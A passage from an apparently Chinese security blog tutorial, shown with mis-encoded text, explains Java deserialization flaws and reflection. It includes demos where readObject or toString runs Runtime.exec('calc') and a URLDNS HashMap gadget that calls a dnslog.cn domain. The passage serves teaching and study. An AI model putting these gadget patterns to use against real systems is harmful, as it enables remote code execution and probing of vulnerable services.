244);&quot;&gt;readObject&lt;/font&gt;</code><font style="color:rgb(51, 51, 51);">ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</font></li><li><font style="color:rgb(51, 51, 51);">å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨</font></li><li><font style="color:rgb(51, 51, 51);">å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨</font></li><li><font style="color:rgb(51, 51, 51);">æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</font></li></ol><h3 id="1-5-1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"><a href="#1-5-1-å…¥å£ç±»çš„-readObject-ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•" class="headerlink" title="1.5.1 å…¥å£ç±»çš„ readObject ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•"></a>1.5.1 å…¥å£ç±»çš„ <code>readObject</code> ç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</h3><p>Person ç±»ä¸­å†™å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-comment">//è°ƒç”¨é»˜è®¤çš„ååºåˆ—åŒ–è¿‡ç¨‹</span><br>    ois.defaultReadObject();<br>    <span class="hljs-comment">//æ‰§è¡Œäº†ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤</span><br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> ååºåˆ—åŒ–æ—¶ JVM ä¼šå…ˆè°ƒç”¨ Person ç±»ä¸­è‡ªå®šä¹‰çš„ <code>readObject</code> æ–¹æ³•ï¼Œè€Œå…¶ä¸­åŠ å…¥äº†å‘½ä»¤æ‰§è¡Œé€»è¾‘ï¼Œå› æ­¤å¯¹è±¡æ¢å¤è¿‡ç¨‹ä¸­å°±è§¦å‘äº†è®¡ç®—å™¨çš„è¿è¡Œã€‚  </p><p>ä¾æ¬¡æ‰§è¡Œåºåˆ—åŒ–ã€ååºåˆ—åŒ–ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png"></p><h3 id="1-5-2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#1-5-2-å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="1.5.2 å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨"></a>1.5.2 å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObject æ—¶è°ƒç”¨</h3><p>ä¸ºä»€ä¹ˆHashMapè¦è‡ªå·±å®ç°writeObjectå’ŒreadObjectæ–¹æ³•ï¼Ÿ</p><p><a href="https://juejin.cn/post/6844903954774491144">https://juejin.cn/post/6844903954774491144</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://w9ge5j.dnslog.cn&quot;</span>);<br>        hash.put(u, <span class="hljs-number">1</span>);<br><br>        serializableTest(hash);<br>        unserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-comment">// ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializableTest</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png"></p><p><code>URL</code> ç±»åœ¨ JDK é‡Œæ˜¯è‡ªå¸¦çš„ç±»ï¼Œå®ƒçš„ <code>hashCode()</code> æ–¹æ³•é‡Œä¼šè§¦å‘ DNS è§£æ  </p><p> å…¥å£å‚æ•°é‡ŒåŒ…å«äº†å¯æ§çš„ç±»ï¼ˆ<code>URL</code>ï¼‰ï¼Œè€Œè¯¥ç±»åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨è°ƒç”¨å±é™©æ–¹æ³•ï¼ˆ<code>hashCode()</code> è§¦å‘ DNS è§£æï¼‰ï¼Œé‚£ä¹ˆåœ¨ <code>readObject()</code> ååºåˆ—åŒ–æ—¶å°±ä¼šæ‰§è¡Œè¿™äº›å±é™©é€»è¾‘ï¼Œé€ æˆå®‰å…¨é£é™©ã€‚  </p><h4 id="HashMap-æ‰¾å…¥å£ç±»åˆ†æï¼š"><a href="#HashMap-æ‰¾å…¥å£ç±»åˆ†æï¼š" class="headerlink" title="HashMap æ‰¾å…¥å£ç±»åˆ†æï¼š"></a>HashMap æ‰¾å…¥å£ç±»åˆ†æï¼š</h4><p>æœ¬ä¾‹ä¸­çš„ä»£ç åˆ©ç”¨äº† <font style="color:#080808;background-color:#ffffff;">HashMap&lt;URL, Integer&gt;</font>ï¼Œé‚£ä¹ˆçœ‹çœ‹ä¸ºä»€ä¹ˆå®ƒä¼šé€ æˆæ¼æ´</p><p>è·Ÿè¿› HashMap ï¼Œæ­¤å¤„ç»§æ‰¿äº† <font style="color:#080808;background-color:#ffffff;">Serializable</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png"></p><p>æ‰¾åˆ°é‡å†™çš„ readObject</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752120.png"></p><p>è·Ÿè¿› hash</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png"></p><p>è·Ÿè¿› hashCode,<font style="color:rgb(80, 80, 92);">hashCode ä½ç½®å¤„äº Object ç±»å½“ä¸­</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png"></p><p>è¿™æ ·ï¼ŒHashMap å®Œç¾æ»¡è¶³äº†å¯åºåˆ—åŒ–ã€é‡å†™ readObjectã€æ¥æ”¶ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°ã€JDK è‡ªå¸¦çš„å…¥å£ç±»æ¡ä»¶ã€‚</p><h3 id="1-5-3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨"><a href="#1-5-3-å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject-æ—¶è°ƒç”¨" class="headerlink" title="1.5.3 å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨"></a><font style="color:rgb(51, 51, 51);">1.5.3 å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObject æ—¶è°ƒç”¨</font></h3><h3 id="1-5-4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"><a href="#1-5-4-æ„é€ å‡½æ•°-é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ" class="headerlink" title="1.5.4 æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ"></a><font style="color:rgb(51, 51, 51);">1.5.4 æ„é€ å‡½æ•°&#x2F;é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</font></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>     <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>&#125;  <br><br><span class="hljs-comment">//å¯¹objå¯¹è±¡è¿›è¡Œè¾“å‡º é»˜è®¤è°ƒç”¨åŸå§‹å¯¹è±¡çš„toString æ–¹æ³•</span><br>System.out.println(obj);<br></code></pre></td></tr></table></figure><p> åœ¨ <code>toString()</code> ä¸­å†™å…¥å±é™©é€»è¾‘ï¼Œé‚£ä¹ˆåªè¦å¯¹è±¡åœ¨æ‰“å°æ—¶è¢«éšå¼è°ƒç”¨ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡Œæ¶æ„ä»£ç   </p><h2 id="1-6-æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶"><a href="#1-6-æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶" class="headerlink" title="1.6 æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶"></a>1.6 æ‰¾æ¼æ´çš„ä¸‰ä¸ªæ¡ä»¶</h2><p>é¦–å…ˆä¸€ä¸ªå‰æï¼š<strong><font style="color:rgb(80, 80, 92);">ç»§æ‰¿äº† </font></strong><font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">ï¼Œä½¿å¯¹è±¡å¯åºåˆ—åŒ–</font></p><ul><li>å…¥å£ç±» source<ul><li>å¯åºåˆ—åŒ–</li><li>é‡å†™ readObject è°ƒç”¨å¸¸è§å‡½æ•°</li><li>æ¥æ”¶ä»»æ„å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå‚æ•°ç±»å‹å®½æ³›</li><li>æœ€å JDK è‡ªå¸¦</li></ul></li><li>è°ƒç”¨é“¾ gadget chain</li><li>æ‰§è¡Œç±» sink <ul><li><font style="color:rgb(80, 80, 92);">RCE SSRF å†™æ–‡ä»¶ç­‰ç­‰</font></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png"></p><h1 id="2ã€Java-åå°„-URLDNS-é“¾"><a href="#2ã€Java-åå°„-URLDNS-é“¾" class="headerlink" title="2ã€Java åå°„+URLDNS é“¾"></a><font style="color:rgb(76, 76, 87);">2ã€Java åå°„+URLDNS é“¾</font></h1><h2 id="2-1-Java-åå°„ç†è§£"><a href="#2-1-Java-åå°„ç†è§£" class="headerlink" title="2.1 Java åå°„ç†è§£"></a>2.1 Java åå°„ç†è§£</h2><blockquote><p><font style="color:rgb(37, 41, 51);">è°ˆè°ˆJavaåå°„ï¼šä»å…¥é—¨åˆ°å®è·µï¼Œå†åˆ°åŸç†</font></p><p><a href="https://juejin.cn/post/6844904025607897096">https://juejin.cn/post/6844904025607897096</a></p></blockquote><p>åå°„çš„ä½œç”¨ï¼šè®© Java å…·æœ‰åŠ¨æ€æ€§</p><h3 id="2-1-1-é™æ€è¯­è¨€-VS-åŠ¨æ€è¯­è¨€"><a href="#2-1-1-é™æ€è¯­è¨€-VS-åŠ¨æ€è¯­è¨€" class="headerlink" title="2.1.1 é™æ€è¯­è¨€ VS åŠ¨æ€è¯­è¨€"></a>2.1.1 é™æ€è¯­è¨€ VS åŠ¨æ€è¯­è¨€</h3><p>Java æœ¬èº«ä½¿ä¸€ç§é™æ€è¯­è¨€ï¼Œç¼–è¯‘æ—¶å°±å†³å®šäº†ç±»å‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç¼–è¯‘å™¨è®¤ä¸º student çš„ç±»å‹æ˜¯ Studentï¼Œ</span><br><span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br></code></pre></td></tr></table></figure><p>è€ŒåŠ¨æ€è¯­è¨€ï¼Œæ¯”å¦‚PHPï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;hello&quot;</span>;  <span class="hljs-comment">// æ­¤æ—¶ $var æ˜¯å­—ç¬¦ä¸²</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">123</span>;      <span class="hljs-comment">// è¿è¡Œæ—¶å†èµ‹å€¼ï¼Œç°åœ¨ $var å°±æ˜¯æ•´æ•°</span><br></code></pre></td></tr></table></figure><p>å†æ¬¡å¯¹æ¯”ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753866.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png"></p><h3 id="2-1-2-æ­£å°„ä¸åå°„"><a href="#2-1-2-æ­£å°„ä¸åå°„" class="headerlink" title="2.1.2 æ­£å°„ä¸åå°„"></a><font style="color:rgb(76, 76, 87);">2.1.2 æ­£å°„ä¸åå°„</font></h3><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html">å®˜æ–¹å¯¹åå°„çš„è§£é‡Š</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png"></p><p><strong>åå°„æœºåˆ¶</strong>ä½¿Javaä»£ç èƒ½å¤Ÿæ¢æŸ¥å·²åŠ è½½ç±»çš„å­—æ®µã€æ–¹æ³•åŠæ„é€ å‡½æ•°ä¿¡æ¯ï¼Œå¹¶åœ¨å®‰å…¨é™åˆ¶èŒƒå›´å†…ï¼Œé€šè¿‡åå°„å­—æ®µã€æ–¹æ³•å’Œæ„é€ å‡½æ•°å¯¹è¿™äº›åº•å±‚å¯¹åº”å…ƒç´ è¿›è¡Œæ“ä½œã€‚è¯¥ API æ—¢æ”¯æŒéœ€è¦è®¿é—®ç›®æ ‡å¯¹è±¡å…¬å…±æˆå‘˜ï¼ˆåŸºäºå…¶è¿è¡Œæ—¶ç±»ï¼‰çš„åº”ç”¨ç¨‹åºï¼Œä¹Ÿæ”¯æŒè®¿é—®ç»™å®šç±»å£°æ˜æˆå‘˜çš„åœºæ™¯ï¼ŒåŒæ—¶å…è®¸ç¨‹åºæŠ‘åˆ¶é»˜è®¤çš„åå°„è®¿é—®æ§åˆ¶ã€‚</p><p><strong>æ­£å°„ï¼ˆç›´æ¥è°ƒç”¨ï¼‰ï¼šåœ¨æœªè¿è¡Œæ—¶ï¼ˆç¼–è¯‘æ—¶ï¼‰å·²ç»çŸ¥é“äº†è¦è¿è¡Œçš„ç±»</strong> <strong>Student</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753359.png"></p><p><strong>åå°„ï¼šåœ¨è¿è¡Œçš„æ—¶å€™ forName ä» className&#x3D;â€com.demo02.Studentâ€ åŠ è½½ Student ç±»ï¼Œå†å»è°ƒç”¨æ–¹æ³•</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png"></p><h3 id="2-1-3-Class-å¯¹è±¡ç†è§£"><a href="#2-1-3-Class-å¯¹è±¡ç†è§£" class="headerlink" title="2.1.3 Class å¯¹è±¡ç†è§£"></a>2.1.3 Class å¯¹è±¡ç†è§£</h3><p><font style="color:rgb(37, 41, 51);"> å…ˆç†è§£ ï¼š</font><strong><font style="color:rgb(37, 41, 51);">RTTIï¼ˆRun-Time Type Identificationï¼‰è¿è¡Œæ—¶ç±»å‹è¯†åˆ«</font></strong></p><p>Java åœ¨è¿è¡Œæ—¶è¯†åˆ«å¯¹è±¡å’Œç±»çš„ä¿¡æ¯ä¸»è¦ä»¥ä¿©ç§æ–¹å¼ï¼šä¸€ç§æ˜¯ RTTI ï¼Œå®ƒå‡å®šæˆ‘ä»¬åœ¨ç¼–è¯‘æœŸå·²çŸ¥é“äº†æ‰€æœ‰ç±»å‹ï¼›å¦ä¸€ç§æ˜¯ åå°„ï¼Œåœ¨è¿è¡Œæ—¶å‘ç°å’Œä½¿ç”¨ç±»çš„ä¿¡æ¯ã€‚</p><p><strong><font style="color:rgb(37, 41, 51);">æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªClasså¯¹è±¡</font></strong><font style="color:rgb(37, 41, 51);">ï¼Œæ¯å½“ç¼–è¯‘ä¸€ä¸ªæ–°ç±»å°±äº§ç”Ÿä¸€ä¸ªClasså¯¹è±¡ï¼ˆæ›´æ°å½“åœ°è¯´ï¼Œæ˜¯è¢«ä¿å­˜åœ¨ä¸€ä¸ªåŒåçš„.classæ–‡ä»¶ä¸­ï¼‰ã€‚</font></p><p><font style="color:rgb(37, 41, 51);">æ¯”å¦‚åˆ›å»ºä¸€ä¸ªStudentç±»ï¼Œé‚£ä¹ˆï¼ŒJVMå°±ä¼šåˆ›å»ºä¸€ä¸ªStudentå¯¹åº”Classç±»çš„Classå¯¹è±¡ï¼Œè¯¥Classå¯¹è±¡ä¿å­˜äº†Studentç±»ç›¸å…³çš„ç±»å‹ä¿¡æ¯ã€‚</font></p><p><strong><font style="color:rgb(37, 41, 51);">Classç±»çš„å¯¹è±¡ä½œç”¨</font></strong><font style="color:rgb(37, 41, 51);">æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp"></p><h2 id="2-2-åå°„ä½¿ç”¨"><a href="#2-2-åå°„ä½¿ç”¨" class="headerlink" title="2.2 åå°„ä½¿ç”¨"></a>2.2 åå°„ä½¿ç”¨</h2><h3 id="2-2-1-åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•"><a href="#2-2-1-åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•" class="headerlink" title="2.2.1 åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•"></a>2.2.1 åå°„ä¸­æä¸ºé‡è¦çš„æ–¹æ³•</h3><ul><li>è·å–ç±»çš„æ–¹æ³•ï¼šforName</li><li>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance</li><li>è·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod</li><li>æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke</li></ul><h3 id="2-2-2-è·å–-Class-ç±»å¯¹è±¡"><a href="#2-2-2-è·å–-Class-ç±»å¯¹è±¡" class="headerlink" title="2.2.2 è·å– Class ç±»å¯¹è±¡"></a>2.2.2 è·å– Class ç±»å¯¹è±¡</h3><ul><li>å·²çŸ¥<strong>å…·ä½“çš„ç±»</strong>ï¼Œé€šè¿‡ç±»çš„ <strong>class</strong> å±æ€§è·å–ï¼Œ</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Person.class;<br></code></pre></td></tr></table></figure><ul><li>å·²çŸ¥æŸä¸ª<strong>ç±»çš„å®ä¾‹</strong>ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„ **getClass() **æ–¹æ³•è·å– Class å¯¹è±¡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><ul><li>å·²çŸ¥ä¸€ä¸ª<strong>ç±»çš„å…¨ç±»å</strong>ï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯é€šè¿‡ Class ç±»çš„<strong>é™æ€æ–¹æ³• forName()</strong> è·å–ï¼Œå¯èƒ½æŠ›å‡º ClassNotFoundException</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.reflection;<br><br><span class="hljs-comment">//æµ‹è¯• class ç±»çš„åˆ›å»ºæ–¹å¼æœ‰å“ªäº›</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;è¿™ä¸ªäººæ˜¯ï¼š&quot;</span>+person.name);<br><br>        <span class="hljs-comment">//æ–¹å¼ä¸€ï¼šé€šè¿‡å¯¹è±¡è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> person.getClass();<br>        System.out.println(c1.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼äºŒï¼šfoename è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.kuang.reflection.Student&quot;</span>);<br>        System.out.println(c2.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼ä¸‰ï¼šé€šè¿‡ç±»å .class è·å¾—</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> Student.class;<br>        System.out.println(c3.hashCode());<br><br>        <span class="hljs-comment">//æ–¹å¼å››ï¼šåŸºæœ¬å†…ç½®ç±»å‹çš„åŒ…è£…ç±»éƒ½æœ‰ä¸€ä¸ª Type å±æ€§</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> Integer.TYPE;<br>        System.out.println(c4);<br><br>        <span class="hljs-comment">//è·å¾—çˆ¶ç±»ç±»å‹</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c5</span> <span class="hljs-operator">=</span> c1.getSuperclass();<br>        System.out.println(c5);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = <span 